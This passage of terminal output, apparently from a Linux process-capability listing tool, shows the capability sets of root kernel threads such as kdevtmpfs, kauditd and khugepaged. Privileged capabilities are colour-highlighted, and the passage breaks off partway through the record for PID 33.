  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 25 (kdevtmpfs) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 26 (inet_frag_wq) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 27 (kauditd) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 28 (khungtaskd) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 29 (oom_reaper) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 30 (writeback) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 31 (kcompactd0) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 32 (ksmd) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 33 (khugepaged) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
